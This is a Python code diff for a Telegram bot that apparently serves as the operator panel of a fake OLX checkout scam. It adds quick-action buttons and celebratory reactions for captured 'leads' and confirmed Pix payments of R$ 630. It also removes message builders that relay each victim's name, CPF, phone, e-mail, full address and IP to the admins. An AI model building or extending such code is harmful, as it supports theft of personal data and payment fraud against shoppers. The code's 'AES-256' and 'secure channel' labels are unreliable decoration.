@@ -415,6 +415,27 @@ def main_keyboard(tg_id: int = 0) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(rows)
 
 
+def notification_lead_keyboard(whatsapp: str = "") -> InlineKeyboardMarkup:
+    """Botões de ação rápida para notificação de lead capturado."""
+    rows = []
+    if whatsapp:
+        clean_wa = whatsapp.replace('+', '').replace('-', '').replace(' ', '')
+        rows.append([InlineKeyboardButton("📲 Contatar no WhatsApp", url=f"https://wa.me/{clean_wa}")])
+    rows.append([
+        InlineKeyboardButton("📊 Dashboard", callback_data="stats_24"),
+        InlineKeyboardButton("📋 Ver Logs",  callback_data="recent_logs"),
+    ])
+    return InlineKeyboardMarkup(rows)
+
+
+def notification_payment_keyboard(payment_id: str = "") -> InlineKeyboardMarkup:
+    """Botões de ação rápida para notificação de pagamento confirmado."""
+    return InlineKeyboardMarkup([[
+        InlineKeyboardButton("📊 Ver Métricas", callback_data="stats_24"),
+        InlineKeyboardButton("📋 Audit Log",    callback_data="recent_logs"),
+    ]])
+
+
 def wa_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("📞 Alterar Número WhatsApp", callback_data="wa_set_number")],
@@ -484,70 +505,6 @@ def build_stats_msg(s: dict) -> str:
         f"📈 *Taxa Geral de Conversão:* `{s['conv_rate']}%`\n\n"
         f"🔒 _Relatório gerado sob criptografia de canal seguro._"
     )
-
-def build_logs_msg(events: list) -> str:
-    if not events:
-        return "📋 *Nenhum evento registrado no banco criptografado.*"
-    ICONS = {
-        "PAGE_ENTRY": "🟢", "PAGE_EXIT": "🔴", "CLICK_BUY": "🛒",
-        "CLICK_CHAT": "💬", "MODAL_STEP": "📍", "PIX_GENERATED": "🔵",
-        "PAYMENT_CONFIRMED": "✅", "WHATSAPP_REDIRECT": "📱",
-        "CEP_LOOKUP": "📮", "PHOTO_CLICK": "🖼️",
-    }
-    lines = ["📋 *AUDITORIA DE SEGURANÇA — ÚLTIMOS EVENTOS*\n═════════════════════════════════════"]
-    for ev in events:
-        ts  = datetime.fromtimestamp(ev["ts"]).strftime("%d/%m/%Y %H:%M:%S")
-        ico = ICONS.get(ev["type"], "🛡️")
-        ip  = ev["ip"] or "IP Oculto"
-        lines.append(f"{ico} `{ev['type']}`  •  `{ip}`  •  _{ts}_")
-    lines.append("\n🔒 _Todos os payloads estão salvos em AES-256._")
-    return "\n".join(lines)
-
-def build_notification(event_type: str, data: dict) -> str:
-    ts = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-    ip = data.get("ip", "Protegido")
-    if event_type == "PAGE_ENTRY":
-        return f"🟢 *NOVO ACESSO DETECTADO*\n═════════════════════════════\n🌐 IP: `{ip}`\n📱 User-Agent: `{str(data.get('ua','N/A'))[:60]}`\n⏰ Horário: `{ts}`"
-    if event_type == "CEP_LOOKUP":
-        return (
-            f"📮 *CONSULTA DE FRETE REALIZADA*\n"
-            f"═════════════════════════════\n"
-            f"📮 *CEP:* `{data.get('cep','N/A')}`\n"
-            f"🏠 *Endereço:* `{data.get('address','N/A')}`\n"
-            f"🚚 *Frete:* `Grátis (Garantia OLX)`\n"
-            f"🌐 *IP:* `{ip}`\n"
-            f"⏰ *Horário:* `{ts}`"
-        )
-    if event_type == "LEAD_CAPTURED":
-        return (
-            f"👤 *NOVO LEAD QUALIFICADO (DADOS COMPLETOS)*\n"
-            f"═════════════════════════════\n"
-            f"👤 *Nome:* `{data.get('name','N/A')}`\n"
-            f"🪪 *CPF:* `{data.get('cpf','N/A')}`\n"
-            f"📱 *WhatsApp:* `{data.get('phone','N/A')}`\n"
-            f"✉️ *E-mail:* `{data.get('email','N/A')}`\n"
-            f"📮 *CEP:* `{data.get('cep','N/A')}`\n"
-            f"🏠 *Endereço:* `{data.get('street','N/A')}, Nº {data.get('number','N/A')}`\n"
-            f"🏢 *Compl:* `{data.get('complement','-')}`\n"
-            f"📍 *Bairro:* `{data.get('neighborhood','N/A')}`\n"
-            f"🏙️ *Cidade/UF:* `{data.get('city','N/A')} - {data.get('state','N/A')}`\n"
-            f"💰 *Valor:* `R$ {data.get('amount','630,00')}`\n"
-            f"🌐 *IP:* `{ip}`\n"
-            f"⏰ *Horário:* `{ts}`\n"
-            f"═════════════════════════════\n"
-            f"⚡ _Lead avançando para geração do Pix!_"
-        )
-    if event_type == "CLICK_BUY":
-        return f"🛒 *AÇÃO DE COMPRA INICIADA*\n═════════════════════════════\n🌐 IP: `{ip}`\n📍 Etapa do Funil: `{data.get('step','1')}`\n⏰ Horário: `{ts}`"
-    if event_type == "CLICK_CHAT":
-        return f"💬 *SOLICITAÇÃO DE ATENDIMENTO*\n═════════════════════════════\n🌐 IP: `{ip}`\n⏰ Horário: `{ts}`"
-    if event_type == "PIX_GENERATED":
-        return f"🔵 *PIX GERADO COM SUCESSO*\n═════════════════════════════\n💰 Valor: `R$ {data.get('amount','630,00')}`\n🆔 ID Transação: `{data.get('payment_id','N/A')}`\n🌐 IP: `{ip}`\n⏰ Horário: `{ts}`"
-    if event_type == "PAYMENT_CONFIRMED":
-        return f"✅ *PAGAMENTO CONFIRMADO & CONVERTIDO!*\n═════════════════════════════\n💰 Valor: `R$ {data.get('amount','630,00')}`\n🆔 Transação ID: `{data.get('payment_id','N/A')}`\n🌐 IP: `{ip}`\n⏰ Horário: `{ts}`"
-    if event_type == "WHATSAPP_REDIRECT":
-        return f"📱 *REDIRECIONAMENTO WHATSAPP*\n═════════════════════════════\n🌐 IP: `{ip}`\n⏰ Horário: `{ts}`"
-    return None
 
 # ─── AUTHENTICATION DE CORPO ADMINISTRATIVO ───────────────────────────────────
 def admin_only(func):
@@ -1731,16 +1688,55 @@ def notify_admins(event_type: str, data: dict):
 
     token = BOT_TOKEN or os.environ.get("TELEGRAM_BOT_TOKEN", "")
 
+    # Reações automáticas para eventos de alta prioridade
+    REACTION_EVENTS = {
+        "LEAD_CAPTURED":    "🔥",   # fogo — lead quente!
+        "PAYMENT_CONFIRMED": "🎉", # confete — pagamento!
+        "PIX_GENERATED":    "💰",   # dinheiro — pix gerado
+    }
+
     for target in targets:
         try:
+            kb = build_notification_keyboard(event_type, data)
             if _bot_instance:
-                _bot_instance.send_message(chat_id=target, text=msg, parse_mode=ParseMode.MARKDOWN)
+                sent = _bot_instance.send_message(
+                    chat_id=target,
+                    text=msg,
+                    parse_mode=ParseMode.MARKDOWN,
+                    reply_markup=kb
+                )
+                # Enviar reação se evento for prioritário
+                reaction_emoji = REACTION_EVENTS.get(event_type)
+                if reaction_emoji and sent:
+                    try:
+                        _bot_instance.set_message_reaction(
+                            chat_id=target,
+                            message_id=sent.message_id,
+                            reaction=[{"type": "emoji", "emoji": reaction_emoji}]
+                        )
+                    except Exception:
+                        pass  # Reações não suportadas em todos os chats, ignora silenciosamente
             elif token:
-                requests.post(
+                resp = requests.post(
                     f"https://api.telegram.org/bot{token}/sendMessage",
-                    json={"chat_id": target, "text": msg, "parse_mode": "Markdown"},
+                    json={"chat_id": target, "text": msg, "parse_mode": "Markdown",
+                          "reply_markup": kb.to_dict() if kb else None},
                     timeout=5
                 )
+                # Reação via API REST
+                reaction_emoji = REACTION_EVENTS.get(event_type)
+                if reaction_emoji and resp.ok:
+                    mid = resp.json().get("result", {}).get("message_id")
+                    if mid:
+                        try:
+                            requests.post(
+                                f"https://api.telegram.org/bot{token}/setMessageReaction",
+                                json={"chat_id": target, "message_id": mid,
+                                      "reaction": [{"type": "emoji", "emoji": reaction_emoji}]},
+                                timeout=3
+                            )
+                        except Exception:
+                            pass
         except Exception as e:
             logger.warning(f"[NOTIFY ERROR] Target {target}: {e}")
 
